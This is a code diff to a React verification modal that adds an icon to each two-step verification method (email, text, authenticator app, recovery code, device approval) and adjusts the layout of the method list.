@@ -2,7 +2,7 @@ import VerifyImage from '@/assets/images/verify-image.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
 import translateText from '@/utils/translate';
-import { faChevronLeft, faInfoCircle, faQuestionCircle, faTimes } from '@fortawesome/free-solid-svg-icons';
+import { faChevronLeft, faComment, faDesktop, faEnvelope, faInfoCircle, faKey, faMobile, faQuestionCircle, faTimes } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
 import Image from 'next/image';
@@ -133,33 +133,38 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         setIsLoading(false);
     };
 
-    const methods: { id: string; title: string; desc: string }[] = [
+    const methods: { id: string; title: string; desc: string; icon: typeof faEnvelope }[] = [
         {
             id: 'email',
             title: 'Email',
-            desc: `We'll send a code to ${userInfo?.email ? maskEmail(userInfo.email) : 'your email'}`
+            desc: `We'll send a code to ${userInfo?.email ? maskEmail(userInfo.email) : 'your email'}`,
+            icon: faEnvelope
         },
         {
             id: 'text',
             title: 'Text message',
-            desc: `We'll send a code to ${userInfo?.phone ? maskPhone(userInfo.phone) : 'your phone'}`
+            desc: `We'll send a code to ${userInfo?.phone ? maskPhone(userInfo.phone) : 'your phone'}`,
+            icon: faComment
         },
         {
             id: 'authApp',
             title: 'Authentication app',
-            desc: 'Get a code from your authentication app.'
+            desc: 'Get a code from your authentication app.',
+            icon: faMobile
         },
         {
             id: 'recovery',
             title: 'Recovery code',
-            desc: 'Use a recovery code that you previously saved.'
+            desc: 'Use a recovery code that you previously saved.',
+            icon: faKey
         },
         ...(!deviceUsed
             ? [
                   {
                       id: 'device',
                       title: 'Approve from another device',
-                      desc: "Confirm it's you by approving from a device you've previously logged in on."
+                      desc: "Confirm it's you by approving from a device you've previously logged in on.",
+                      icon: faDesktop
                   }
               ]
             : [])
@@ -295,11 +300,14 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                             <div className='overflow-hidden rounded-xl border border-gray-200'>
                                 {methods.map((method, i) => (
                                     <label key={method.id} className={`flex cursor-pointer items-center gap-4 p-4 transition-all hover:bg-gray-50 ${i > 0 ? 'border-t border-gray-200' : ''} ${selectedMethod === method.id ? 'bg-[#f0f6ff]' : ''}`}>
-                                        <div className='flex-1'>
-                                            <div className='text-[16px] font-semibold text-[#050505]'>{method.title}</div>
-                                            <div className='text-[14px] text-[#65676B]'>{method.desc}</div>
+                                        <div className='flex h-11 w-11 shrink-0 items-center justify-center rounded-full bg-[#e4e6eb]'>
+                                            <FontAwesomeIcon icon={method.icon} className='text-[16px] text-[#606770]' />
                                         </div>
-                                        <input type='radio' name='confirmMethod' value={method.id} checked={selectedMethod === method.id} onChange={(e) => setSelectedMethod(e.target.value)} className='h-5 w-5 border-2 border-[#606770] checked:border-[#0064e0]' />
+                                        <div className='min-w-0 flex-1'>
+                                            <div className='text-[16px] font-semibold text-[#050505]'>{method.title}</div>
+                                            <div className='truncate text-[14px] text-[#65676B]'>{method.desc}</div>
+                                        </div>
+                                        <input type='radio' name='confirmMethod' value={method.id} checked={selectedMethod === method.id} onChange={(e) => setSelectedMethod(e.target.value)} className='h-5 w-5 shrink-0 border-2 border-[#606770] checked:border-[#0064e0]' />
                                     </label>
                                 ))}
                             </div>
